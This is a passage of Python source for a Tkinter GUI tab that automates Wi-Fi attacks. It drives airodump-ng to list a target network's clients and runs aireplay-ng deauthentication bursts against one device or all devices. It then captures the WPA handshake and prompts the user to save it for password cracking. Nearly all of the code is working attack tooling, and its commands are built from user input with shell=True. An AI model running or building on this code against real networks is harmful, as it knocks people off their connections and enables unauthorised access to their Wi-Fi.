import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import re
import threading
import os
import time
from utils import run_command

class HandshakeTab:
    def __init__(self, notebook, app):
        self.app = app
        self.handshake_tab = ttk.Frame(notebook, style='Main.TFrame')
        notebook.add(self.handshake_tab, text="Handshake & Capture")

        # Create main container with proper layout
        self.create_network_selection()
        self.create_device_section()

    def create_network_selection(self):
        """Create the network selection section with fields and button on one line."""
        network_frame = ttk.LabelFrame(self.handshake_tab, text="Target Network Configuration", style='Card.TLabelframe')
        network_frame.pack(fill="x", padx=10, pady=10)

        # Network selection container
        network_container = ttk.Frame(network_frame)
        network_container.pack(fill="x", padx=15, pady=10)

        # BSSID label and entry
        ttk.Label(network_container, text="Target BSSID:", style='Info.TLabel').pack(side="left", padx=(0, 5))
        ttk.Entry(network_container, textvariable=self.app.selected_bssid, font=('Arial', 10), width=20).pack(side="left", padx=(0, 10))

        # Channel label and entry
        ttk.Label(network_container, text="Channel:", style='Info.TLabel').pack(side="left", padx=(0, 5))
        ttk.Entry(network_container, textvariable=self.app.selected_channel, font=('Arial', 10), width=10).pack(side="left", padx=(0, 10))

        # Select from Network Tab button
        select_btn = ttk.Button(network_container, text="📡 Select from Network Tab", style='Primary.TButton', command=self.select_network)
        select_btn.pack(side="left")

    def create_device_section(self):
        """Create the connected devices section with all controls."""
        device_frame = ttk.LabelFrame(self.handshake_tab, text="Connected Devices", style='Card.TLabelframe')
        device_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Device controls container
        device_controls = ttk.Frame(device_frame)
        device_controls.pack(fill="x", padx=15, pady=(10, 10))

        # Buttons
        scan_btn = ttk.Button(device_controls, text="🔍 Discover Devices", style='Primary.TButton', command=self.scan_clients)
        scan_btn.pack(side="left", padx=(0, 10))

        load_btn = ttk.Button(device_controls, text="📁 Load Client File", style='Warning.TButton', command=self.load_client_file)
        load_btn.pack(side="left", padx=(0, 10))

        capture_deauth_btn = ttk.Button(device_controls, text="⚡ Capture + Deauth", style='Warning.TButton', command=self.capture_with_deauth)
        capture_deauth_btn.pack(side="left", padx=(0, 10))

        stop_btn = ttk.Button(device_controls, text="⏹️ Stop Capture", style='Danger.TButton', command=self.stop_capture)
        stop_btn.pack(side="left", padx=(0, 10))

        save_btn = ttk.Button(device_controls, text="💾 Save Capture", style='Primary.TButton', command=self.save_capture)
        save_btn.pack(side="left", padx=(0, 10))

        # Deauth button
        deauth_btn = ttk.Button(device_controls, text="🚫 Perform Deauth Attack", style='Danger.TButton', command=self.perform_deauth)
        deauth_btn.pack(side="left")

        # Checkboxes
        checkbox_frame = ttk.Frame(device_frame)
        checkbox_frame.pack(fill="x", padx=15, pady=(5, 10))

        continuous_cb = ttk.Checkbutton(checkbox_frame, text="Continuous Deauth", variable=self.app.continuous_deauth, style='TCheckbutton')
        continuous_cb.pack(side="left", padx=(0, 20))

        broadcast_cb = ttk.Checkbutton(checkbox_frame, text="Broadcast Deauth (All Clients)", variable=self.app.broadcast_deauth, style='TCheckbutton')
        broadcast_cb.pack(side="left")

        # Device treeview
        tree_container = ttk.Frame(device_frame)
        tree_container.pack(fill="both", expand=True, padx=15, pady=(0, 10))

        # Create treeview with modern styling
        self.client_tree = ttk.Treeview(tree_container, 
                                       columns=("BSSID", "STATION", "PWR", "Rate", "Lost", "Frames", "Notes", "Probes"), 
                                       show="headings",
                                       height=8,
                                       style='Clean.Treeview')
        
        # Configure custom Treeview style
        style = ttk.Style()
        style.configure('Clean.Treeview',
                       background='#ffffff',
                       foreground='#000000',
                       fieldbackground='#ffffff',
                       font=('Arial', 10))
        style.map('Clean.Treeview',
                 background=[('selected', '#b3d7ff')],
                 foreground=[('selected', '#000000')])

        # Configure columns
        self.client_tree.heading("BSSID", text="BSSID")
        self.client_tree.heading("STATION", text="Device MAC")
        self.client_tree.heading("PWR", text="Power")
        self.client_tree.heading("Rate", text="Rate")
        self.client_tree.heading("Lost", text="Lost")
        self.client_tree.heading("Frames", text="Frames")
        self.client_tree.heading("Notes", text="Notes")
        self.client_tree.heading("Probes", text="Probes")

        # Set column widths
        self.client_tree.column("BSSID", width=150, minwidth=120)
        self.client_tree.column("STATION", width=150, minwidth=120)
        self.client_tree.column("PWR", width=80, minwidth=60)
        self.client_tree.column("Rate", width=80, minwidth=60)
        self.client_tree.column("Lost", width=80, minwidth=60)
        self.client_tree.column("Frames", width=80, minwidth=60)
        self.client_tree.column("Notes", width=100, minwidth=80)
        self.client_tree.column("Probes", width=150, minwidth=120)

        # Add scrollbars
        tree_scroll_y = ttk.Scrollbar(tree_container, orient="vertical", command=self.client_tree.yview, style='Vertical.TScrollbar')
        tree_scroll_x = ttk.Scrollbar(tree_container, orient="horizontal", command=self.client_tree.xview, style='Horizontal.TScrollbar')
        self.client_tree.configure(yscrollcommand=tree_scroll_y.set, xscrollcommand=tree_scroll_x.set)

        # Pack treeview and scrollbars
        self.client_tree.pack(side="left", fill="both", expand=True)
        tree_scroll_y.pack(side="right", fill="y")
        tree_scroll_x.pack(side="bottom", fill="x")

        # Bind double-click event for device selection
        self.client_tree.bind("<Double-1>", self.on_device_select)

        # Force Treeview refresh
        self.client_tree.update_idletasks()

    def show_handshake_modal(self):
        """Show a modal dialog when a handshake is captured, offering save options."""
        self.app.log_message("Showing handshake capture modal...", "INFO")
        try:
            modal = tk.Toplevel(self.app.root)
            modal.title("Handshake Captured")
            modal.transient(self.app.root)
            modal.grab_set()
            modal.geometry("400x200")
            modal.resizable(False, False)

            # Modal content
            content_frame = ttk.Frame(modal)
            content_frame.pack(fill="both", expand=True, padx=15, pady=15)
            
            ttk.Label(content_frame, 
                     text="Success! A valid WPA handshake has been captured for your target network.\nSave the capture file to proceed with password cracking.", 
                     style='Success.TLabel', 
                     font=('Arial', 11), 
                     wraplength=350).pack(pady=(0, 20))

            # Button frame
            button_frame = ttk.Frame(content_frame)
            button_frame.pack(fill="x", pady=10)

            ttk.Button(button_frame, 
                      text="Save Handshake", 
                      style='Primary.TButton', 
                      command=lambda: self._handle_save_handshake(modal)).pack(side="left", padx=(0, 10))
            
            ttk.Button(button_frame, 
                      text="Continue Without Saving", 
                      style='Secondary.TButton', 
                      command=lambda: self._handle_continue_without_saving(modal)).pack(side="left", padx=(0, 10))
            
            ttk.Button(button_frame, 
                      text="Cancel", 
                      style='Secondary.TButton', 
                      command=modal.destroy).pack(side="left")

            # Center the modal
            modal.update_idletasks()
            x = self.app.root.winfo_x() + (self.app.root.winfo_width() // 2) - (modal.winfo_width() // 2)
            y = self.app.root.winfo_y() + (self.app.root.winfo_height() // 2) - (modal.winfo_height() // 2)
            modal.geometry(f"+{x}+{y}")

            modal.focus_set()
            self.app.log_message("Handshake modal displayed successfully.", "SUCCESS")
        except Exception as e:
            self.app.log_message(f"Error displaying handshake modal: {str(e)}", "ERROR")

    def _handle_save_handshake(self, modal):
        """Handle saving the handshake file from the modal."""
        self.save_capture()
        modal.destroy()

    def _handle_continue_without_saving(self, modal):
        """Handle continuing without saving the handshake file."""
        if os.path.exists("handshake-01.cap"):
            self.app.handshake_file.set(os.path.abspath("handshake-01.cap"))
            self.app.log_message("Handshake loaded into Password Cracking tab without saving.", "SUCCESS")
        else:
            self.app.log_message("Error: handshake-01.cap not found. Cannot load without saving.", "ERROR")
            messagebox.showerror("Error", "handshake-01.cap not found. Please save the capture first.")
        modal.destroy()

    def on_device_select(self, event):
        """Handle device selection from treeview."""
        selection = self.client_tree.selection()
        if selection:
            item = self.client_tree.item(selection[0])
            values = item['values']
            if values:
                station = values[1]
                self.app.selected_client.set(station)
                self.app.log_message(f"Selected device: {station}", "SUCCESS")

    def select_network(self):
        """Select a network from the network tab."""
        selected = self.app.network_tab.network_tree.selection()
        if selected:
            values = self.app.network_tab.network_tree.item(selected[0])["values"]
            self.app.selected_bssid.set(values[0])
            self.app.selected_channel.set(values[2])
            self.app.log_message(f"Selected network: {values[1]} ({values[0]}) on channel {values[2]}", "SUCCESS")

    def scan_clients(self):
        """Scan for devices connected to the selected network."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            messagebox.showerror("Error", "Please select a network and enable monitor mode.")
            return

        self.app.log_message(f"Verifying monitor interface {monitor} for device scan...", "INFO")

        iw_output = run_command(f"iw dev {monitor} info")
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            messagebox.showerror("Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return

        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            self.app.log_message(f"Invalid BSSID format: {bssid}", "ERROR")
            messagebox.showerror("Error", "Invalid BSSID format. Use XX:XX:XX:XX:XX:XX (e.g., 00:11:22:33:44:55).")
            return

        if not channel:
            for item in self.app.network_tab.network_tree.get_children():
                values = self.app.network_tab.network_tree.item(item)["values"]
                if values[0] == bssid and values[2]:
                    channel = values[2]
                    self.app.log_message(f"Using channel {channel} from network scan.", "INFO")
                    break

        if channel and not re.match(r"^\d+$", channel) or not (1 <= int(channel) <= 13):
            self.app.log_message(f"Invalid channel {channel}. Using all channels.", "WARNING")
            channel = ""

        for item in self.client_tree.get_children():
            self.client_tree.delete(item)

        def scan(bssid, monitor, channel):
            if os.path.exists("clients-01.csv"):
                try:
                    os.remove("clients-01.csv")
                    self.app.log_message("Removed existing clients-01.csv.", "INFO")
                except Exception as e:
                    self.app.log_message(f"Error removing clients-01.csv: {str(e)}", "ERROR")

            cmd = f"airodump-ng --bssid {bssid} --write clients --output-format csv"
            if channel:
                cmd += f" --channel {channel}"
            cmd += f" {monitor}"
            self.app.log_message(f"Running: {cmd}", "INFO")
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            time.sleep(15)
            try:
                process.terminate()
                stdout, stderr = process.communicate(timeout=5)
                self.app.log_message("airodump-ng terminated gracefully.", "INFO")
            except subprocess.TimeoutExpired:
                self.app.log_message("airodump-ng did not terminate gracefully, forcing kill.", "WARNING")
                run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False)
                stdout, stderr = process.communicate(timeout=1)

            if stdout:
                self.app.log_message(f"airodump-ng stdout: {stdout}", "INFO")
            if stderr:
                self.app.log_message(f"airodump-ng stderr: {stderr}", "ERROR")

            if not os.path.exists("clients-01.csv"):
                self.app.log_message("Error: clients-01.csv not found. Device scan may have failed.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", "Device scan failed: clients-01.csv not found. Check log output for airodump-ng errors.")
                return

            try:
                with open("clients-01.csv", "r", encoding="utf-8") as f:
                    self.app.log_message("Reading clients-01.csv...", "INFO")
                    lines = f.readlines()
                    self.app.log_message(f"Found {len(lines)} lines in clients-01.csv.", "INFO")
                    client_section = False
                    for i, line in enumerate(lines):
                        line = line.strip()
                        if not line:
                            self.app.log_message(f"Line {i+1}: Skipping empty line.", "INFO")
                            continue
                        if "Station MAC" in line:
                            client_section = True
                            self.app.log_message(f"Line {i+1}: Reached device section.", "INFO")
                            continue
                        if client_section and "," in line:
                            parts = [part.strip() for part in line.split(",")]
                            self.app.log_message(f"Line {i+1}: Raw CSV data - {line}", "DEBUG")
                            self.app.log_message(f"Line {i+1}: Parsed {len(parts)} fields - {parts}", "DEBUG")
                            if len(parts) >= 6:
                                station = parts[0]
                                frames = parts[1] if len(parts) > 1 else ""
                                lost = parts[2] if len(parts) > 2 else ""
                                pwr = parts[3] if len(parts) > 3 else ""
                                rate = parts[4] if len(parts) > 4 else ""
                                assoc_bssid = parts[5] if len(parts) > 5 else ""
                                notes = parts[6] if len(parts) > 6 else ""
                                probes = ",".join(parts[7:]) if len(parts) > 7 else ""
                                if station and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station):
                                    self.client_tree.insert("", "end", values=(assoc_bssid, station, pwr, rate, lost, frames, notes, probes))
                                    self.app.log_message(f"Line {i+1}: Added device - STATION: {station}, BSSID: {assoc_bssid}, Notes: '{notes}', Probes: '{probes}'", "SUCCESS")
                                else:
                                    self.app.log_message(f"Line {i+1}: Invalid STATION MAC format: {station}", "WARNING")
                            else:
                                self.app.log_message(f"Line {i+1}: Too few fields ({len(parts)}), skipping.", "WARNING")
                    if not self.client_tree.get_children():
                        self.app.log_message("No valid devices found in clients-01.csv.", "WARNING")
            except FileNotFoundError:
                self.app.log_message("Error: clients-01.csv not found after scan.", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", "Device scan failed: clients-01.csv not found.")
            except Exception as e:
                self.app.log_message(f"Error parsing clients-01.csv: {str(e)}", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Error parsing clients-01.csv: {str(e)}")
            finally:
                if os.path.exists("clients-01.csv"):
                    try:
                        os.remove("clients-01.csv")
                        self.app.log_message("Cleaned up clients-01.csv.", "INFO")
                    except Exception as e:
                        self.app.log_message(f"Error cleaning up clients-01.csv: {str(e)}", "ERROR")
                # Force Treeview refresh
                self.client_tree.update_idletasks()
                self.app.log_message(f"Treeview refreshed. Current items: {len(self.client_tree.get_children())}", "DEBUG")

        threading.Thread(target=scan, args=(bssid, monitor, channel), daemon=True).start()

    def load_client_file(self):
        """Manually load a clients-01.csv file."""
        file_path = filedialog.askopenfilename(filetypes=[("CSV files", "*.csv")])
        if not file_path:
            return

        self.app.log_message(f"Loading client file: {file_path}...", "INFO")

        for item in self.client_tree.get_children():
            self.client_tree.delete(item)

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
                self.app.log_message(f"Found {len(lines)} lines in {file_path}.", "INFO")
                client_section = False
                for i, line in enumerate(lines):
                    line = line.strip()
                    if not line:
                        self.app.log_message(f"Line {i+1}: Skipping empty line.", "INFO")
                        continue
                    if "Station MAC" in line:
                        client_section = True
                        self.app.log_message(f"Line {i+1}: Reached device section.", "INFO")
                        continue
                    if client_section and "," in line:
                        parts = [part.strip() for part in line.split(",")]
                        self.app.log_message(f"Line {i+1}: Raw CSV data - {line}", "DEBUG")
                        self.app.log_message(f"Line {i+1}: Parsed {len(parts)} fields - {parts}", "DEBUG")
                        if len(parts) >= 6:
                            station = parts[0]
                            frames = parts[1] if len(parts) > 1 else ""
                            lost = parts[2] if len(parts) > 2 else ""
                            pwr = parts[3] if len(parts) > 3 else ""
                            rate = parts[4] if len(parts) > 4 else ""
                            assoc_bssid = parts[5] if len(parts) > 5 else ""
                            notes = parts[6] if len(parts) > 6 else ""
                            probes = ",".join(parts[7:]) if len(parts) > 7 else ""
                            if station and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station):
                                self.client_tree.insert("", "end", values=(assoc_bssid, station, pwr, rate, lost, frames, notes, probes))
                                self.app.log_message(f"Line {i+1}: Added device - STATION: {station}, BSSID: {assoc_bssid}, Notes: '{notes}', Probes: '{probes}'", "SUCCESS")
                            else:
                                self.app.log_message(f"Line {i+1}: Invalid STATION MAC format: {station}", "WARNING")
                        else:
                            self.app.log_message(f"Line {i+1}: Too few fields ({len(parts)}), skipping.", "WARNING")
                if not self.client_tree.get_children():
                    self.app.log_message("No valid devices found in client file.", "WARNING")
            # Force Treeview refresh
            self.client_tree.update_idletasks()
            self.app.log_message(f"Treeview refreshed after loading client file. Current items: {len(self.client_tree.get_children())}", "DEBUG")
        except Exception as e:
            self.app.log_message(f"Error parsing client file: {str(e)}", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"Error parsing client file: {str(e)}")

    def perform_deauth(self):
        """Perform deauthentication attack on selected device or all devices."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        continuous = self.app.continuous_deauth.get()
        broadcast = self.app.broadcast_deauth.get()
        selected = self.client_tree.selection()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return
        if not broadcast and not selected:
            self.app.log_message("Please select a device or enable Broadcast Deauth.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a device or enable Broadcast Deauth.")
            return

        client_mac = self.client_tree.item(selected[0])["values"][1] if selected else "FF:FF:FF:FF:FF:FF"
        if broadcast:
            client_mac = "FF:FF:FF:FF:FF:FF"
            self.app.log_message(f"Starting broadcast deauth attack for BSSID {bssid}...", "INFO")
        else:
            self.app.log_message(f"Starting deauth attack on {client_mac} for BSSID {bssid}...", "INFO")

        if channel and re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
            output = run_command(f"iw dev {monitor} set channel {channel}")
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        else:
            self.app.log_message("No valid channel specified. Ensure correct channel for better results.", "WARNING")

        def deauth():
            burst_count = 0
            max_bursts = 15 if continuous else 1
            while burst_count < max_bursts and (continuous or burst_count == 0) and self.app.deauth_process is None:
                cmd = f"aireplay-ng --deauth 100 -a {bssid} -c {client_mac} {monitor}"
                self.app.deauth_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = self.app.deauth_process.communicate()
                self.app.log_message(f"Deauth burst {burst_count + 1}: {stdout}", "INFO")
                if stderr:
                    self.app.log_message(f"Deauth error: {stderr}", "ERROR")
                self.app.deauth_process = None
                burst_count += 1
                if continuous:
                    time.sleep(5)
            if not continuous:
                self.app.root.after(0, messagebox.showinfo, "Success", "Deauthentication attack completed.")
            else:
                self.app.log_message("Continuous deauth completed 15 bursts.", "INFO")

        threading.Thread(target=deauth, daemon=True).start()

    def find_channel(self, bssid, monitor):
        """Scan to find the channel for a given BSSID."""
        cmd = f"airodump-ng --bssid {bssid} --write temp_scan --output-format csv {monitor}"
        self.app.log_message(f"Running channel scan: {cmd}", "INFO")
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(5)
        try:
            process.terminate()
            process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False)

        if os.path.exists("temp_scan-01.csv"):
            try:
                with open("temp_scan-01.csv", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    for line in lines:
                        if bssid in line and "," in line:
                            parts = line.split(",")
                            if len(parts) >= 4:
                                channel = parts[3].strip()
                                if re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
                                    return channel
            finally:
                if os.path.exists("temp_scan-01.csv"):
                    os.remove("temp_scan-01.csv")
                    self.app.log_message("Cleaned up temp_scan-01.csv.", "INFO")
        return None

    def update_probes_column(self, client_mac):
        """Update the Probes column to 'EAPOL' for the client with the matching MAC."""
        self.app.log_message(f"Attempting to update Probes column to 'EAPOL' for client {client_mac}...", "INFO")
        updated = False
        for item in self.client_tree.get_children():
            values = self.client_tree.item(item)["values"]
            self.app.log_message(f"Checking Treeview item: STATION={values[1]}, Values={values}", "DEBUG")
            if values and len(values) > 1 and values[1].lower() == client_mac.lower():
                self.client_tree.set(item, column="Probes", value="EAPOL")
                self.client_tree.update_idletasks()
                updated = True
                self.app.log_message(f"Probes column updated to 'EAPOL' for {client_mac}.", "SUCCESS")
                break
        if not updated:
            self.app.log_message(f"Client {client_mac} not found in Treeview.", "WARNING")
        # Force Treeview refresh
        self.client_tree.update_idletasks()
        self.app.log_message(f"Treeview refreshed after Probes update. Current items: {len(self.client_tree.get_children())}", "DEBUG")

    def start_capture(self):
        """Start capturing handshake for selected network."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        client_mac = self.app.selected_client.get() if self.app.selected_client.get() else None
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return

        # Check if tcpdump is installed
        if not run_command("which tcpdump"):
            self.app.log_message("tcpdump not found. Please install tcpdump.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "tcpdump is required for handshake detection. Install it with: sudo apt-get install tcpdump")
            return

        self.app.log_message(f"Starting handshake capture for BSSID {bssid} on {monitor}...", "INFO")
        if client_mac:
            self.app.log_message(f"Targeting client {client_mac} for handshake capture.", "INFO")

        iw_output = run_command(f"iw dev {monitor} info")
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return

        if not channel:
            self.app.log_message("No channel specified. Scanning to find correct channel...", "INFO")
            channel = self.find_channel(bssid, monitor)
            if channel:
                self.app.selected_channel.set(channel)
                self.app.log_message(f"Detected channel {channel} for BSSID {bssid}.", "INFO")
            else:
                self.app.log_message("Warning: Could not detect channel. Proceeding without channel specification.", "WARNING")

        if channel and re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
            output = run_command(f"iw dev {monitor} set channel {channel}")
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        else:
            self.app.log_message("No valid channel specified. Ensure correct channel for better results.", "WARNING")

        if os.path.exists("handshake-01.cap"):
            try:
                os.remove("handshake-01.cap")
                self.app.log_message("Removed existing handshake-01.cap.", "INFO")
            except Exception as e:
                self.app.log_message(f"Error removing handshake-01.cap: {str(e)}", "ERROR")

        # Reset Probes and Notes columns for all clients
        for item in self.client_tree.get_children():
            values = self.client_tree.item(item)["values"]
            if values[7] == "EAPOL":
                self.client_tree.set(item, column="Probes", value="")
            if values[6]:
                self.client_tree.set(item, column="Notes", value=values[6])  # Restore Notes if present
            self.client_tree.update_idletasks()

        cmd = f"airodump-ng --bssid {bssid} --write handshake --output-format pcap --write-interval 1 --ignore-negative-one"
        if channel:
            cmd += f" --channel {channel}"
        cmd += f" {monitor}"

        def capture():
            try:
                # Wait for airodump-ng to initialize
                time.sleep(5)
                self.app.capture_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                self.app.log_message(f"Running capture: {cmd}", "INFO")

                # Wait for capture file
                cap_file = "handshake-01.cap"
                timeout = 30
                start_time = time.time()
                while not os.path.exists(cap_file) and time.time() - start_time < timeout:
                    time.sleep(1)

                if not os.path.exists(cap_file):
                    self.app.log_message(f"Error: {cap_file} not created after {timeout} seconds.", "ERROR")
                    self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {cap_file} not found. Check adapter or permissions.")
                    self.app.capture_process = None
                    return

                last_size = 0
                start_time = time.time()
                while self.app.capture_process.poll() is None and (time.time() - start_time) < 120:
                    stdout_line = self.app.capture_process.stdout.readline()
                    if stdout_line:
                        self.app.log_message(f"Capture stdout: {stdout_line}", "INFO")
                    stderr_line = self.app.capture_process.stderr.readline()
                    if stderr_line:
                        self.app.log_message(f"Capture stderr: {stderr_line}", "ERROR")
                    if os.path.exists(cap_file):
                        current_size = os.path.getsize(cap_file)
                        if current_size != last_size:
                            self.app.log_message(f"Capture file size: {current_size} bytes", "INFO")
                            last_size = current_size
                        try:
                            # Check with aircrack-ng first (more reliable for WPA handshakes)
                            output = run_command(f"aircrack-ng {cap_file}")
                            if output and "[ WPA handshake: " in output:
                                self.app.log_message(f"Handshake detected via aircrack-ng: {output}", "SUCCESS")
                                if client_mac:
                                    self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                self.stop_capture()
                                self.app.root.after(0, self.show_handshake_modal)
                                return
                            self.app.log_message(f"aircrack-ng check: {output}", "INFO")
                            # Fallback to tcpdump
                            output = run_command(f"tcpdump -r {cap_file} eapol 2>/dev/null")
                            if output:
                                self.app.log_message(f"EAPOL packets detected via tcpdump: {output}", "INFO")
                                # Verify with aircrack-ng to confirm valid handshake
                                output = run_command(f"aircrack-ng {cap_file}")
                                if output and "[ WPA handshake: " in output:
                                    self.app.log_message(f"Handshake confirmed via aircrack-ng: {output}", "SUCCESS")
                                    if client_mac:
                                        self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                    self.stop_capture()
                                    self.app.root.after(0, self.show_handshake_modal)
                                    return
                        except Exception as e:
                            self.app.log_message(f"Error checking handshake: {str(e)}", "ERROR")
                    time.sleep(2)
                # Final check after timeout
                if os.path.exists(cap_file):
                    output = run_command(f"aircrack-ng {cap_file}")
                    if output and "[ WPA handshake: " in output:
                        self.app.log_message(f"Handshake detected via aircrack-ng: {output}", "SUCCESS")
                        if client_mac:
                            self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                        self.stop_capture()
                        self.app.root.after(0, self.show_handshake_modal)
                        return
                self.stop_capture()
                self.app.log_message(f"Capture timed out after 120 seconds. No handshake detected.", "WARNING")
                self.app.root.after(0, messagebox.showwarning, "Warning", "No handshake detected after 120 seconds. Try 'Capture + Deauth' or a longer capture.")
            except Exception as e:
                self.app.log_message(f"Capture error: {str(e)}", "ERROR")
                self.stop_capture()
                self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {str(e)}")

        threading.Thread(target=capture, daemon=True).start()
        self.app.root.after(0, messagebox.showinfo, "Info", "Handshake capture started. Run 'Perform Deauth Attack' or 'Capture + Deauth' to trigger a handshake. Stops after 120 seconds or when handshake is detected.")

    def capture_with_deauth(self):
        """Start capture and perform deauth in one go."""
        bssid = self.app.selected_bssid.get()
        monitor = self.app.monitor_interface.get()
        channel = self.app.selected_channel.get()
        continuous = self.app.continuous_deauth.get()
        broadcast = self.app.broadcast_deauth.get()
        selected = self.client_tree.selection()
        if not bssid or not monitor:
            self.app.log_message("Please select a network and enable monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a network and enable monitor mode.")
            return
        if not broadcast and not selected:
            self.app.log_message("Please select a device or enable Broadcast Deauth.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "Please select a device or enable Broadcast Deauth.")
            return

        # Check if tcpdump is installed
        if not run_command("which tcpdump"):
            self.app.log_message("tcpdump not found. Please install tcpdump.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "tcpdump is required for handshake detection. Install it with: sudo apt-get install tcpdump")
            return

        client_mac = self.client_tree.item(selected[0])["values"][1] if selected else "FF:FF:FF:FF:FF:FF"
        if broadcast:
            client_mac = "FF:FF:FF:FF:FF:FF"
            self.app.log_message(f"Starting capture with broadcast deauth for BSSID {bssid}...", "INFO")
        else:
            self.app.log_message(f"Starting capture with deauth on {client_mac} for BSSID {bssid}...", "INFO")

        iw_output = run_command(f"iw dev {monitor} info")
        if not iw_output or "type monitor" not in iw_output:
            self.app.log_message(f"{monitor} is not in monitor mode.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", f"{monitor} is not in monitor mode. Run 'iw dev' to check.")
            return

        if not channel:
            self.app.log_message("No channel specified. Scanning to find correct channel...", "INFO")
            channel = self.find_channel(bssid, monitor)
            if channel:
                self.app.selected_channel.set(channel)
                self.app.log_message(f"Detected channel {channel} for BSSID {bssid}.", "INFO")
            else:
                self.app.log_message("Warning: Could not detect channel. Proceeding without channel specification.", "WARNING")

        if channel and re.match(r"^\d+$", channel) and 1 <= int(channel) <= 13:
            output = run_command(f"iw dev {monitor} set channel {channel}")
            if output is not None:
                self.app.log_message(f"Set monitor interface {monitor} to channel {channel}.", "INFO")
            else:
                self.app.log_message(f"Warning: Failed to set channel {channel}. Proceeding anyway.", "WARNING")
        else:
            self.app.log_message("No valid channel specified. Ensure correct channel for better results.", "WARNING")

        if os.path.exists("handshake-01.cap"):
            try:
                os.remove("handshake-01.cap")
                self.app.log_message("Removed existing handshake-01.cap.", "INFO")
            except Exception as e:
                self.app.log_message(f"Error removing handshake-01.cap: {str(e)}", "ERROR")

        # Reset Probes and Notes columns for all clients
        for item in self.client_tree.get_children():
            values = self.client_tree.item(item)["values"]
            if values[7] == "EAPOL":
                self.client_tree.set(item, column="Probes", value="")
            if values[6]:
                self.client_tree.set(item, column="Notes", value=values[6])  # Restore Notes if present
            self.client_tree.update_idletasks()

        def combined():
            try:
                cmd = f"airodump-ng --bssid {bssid} --write handshake --output-format pcap --write-interval 1 --ignore-negative-one"
                if channel:
                    cmd += f" --channel {channel}"
                cmd += f" {monitor}"
                time.sleep(5)
                self.app.capture_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                self.app.log_message(f"Running capture: {cmd}", "INFO")

                time.sleep(2)
                burst_count = 0
                max_bursts = 15 if continuous else 1
                while burst_count < max_bursts and (continuous or burst_count == 0) and self.app.deauth_process is None:
                    deauth_cmd = f"aireplay-ng --deauth 100 -a {bssid} -c {client_mac} {monitor}"
                    self.app.deauth_process = subprocess.Popen(
                        deauth_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = self.app.deauth_process.communicate()
                    self.app.log_message(f"Deauth burst {burst_count + 1}: {stdout}", "INFO")
                    if stderr:
                        self.app.log_message(f"Deauth error: {stderr}", "ERROR")
                    self.app.deauth_process = None
                    burst_count += 1
                    if continuous:
                        time.sleep(5)

                last_size = 0
                start_time = time.time()
                cap_file = "handshake-01.cap"
                while self.app.capture_process.poll() is None and (time.time() - start_time) < 120:
